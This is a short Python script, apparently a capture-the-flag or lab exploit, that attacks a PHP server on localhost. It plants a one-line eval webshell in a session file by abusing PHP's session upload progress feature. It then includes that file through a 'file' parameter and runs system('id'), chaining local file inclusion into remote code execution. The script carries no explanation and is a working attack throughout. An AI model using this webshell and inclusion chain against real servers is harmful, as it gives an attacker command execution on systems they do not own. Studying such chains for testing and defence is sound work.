import requests
import io

url = "http://127.0.0.1:12345/phpinfo.php"
webshell = "<?php eval($_REQUEST['code']);?>"
cookies = {"PHPSESSID":"shell"} # /sess/path/sess_shell
requests.post(url,files={"file":(webshell,"_")},data={"PHP_SESSION_UPLOAD_PROGRESS":"_"},cookies=cookies)

url = "http://127.0.0.1:12345/"
params={"file":"/var/lib/php/sessions/sess_shell" , "code":"system('id');"}
resp = requests.get(url , params=params)
print(resp.text)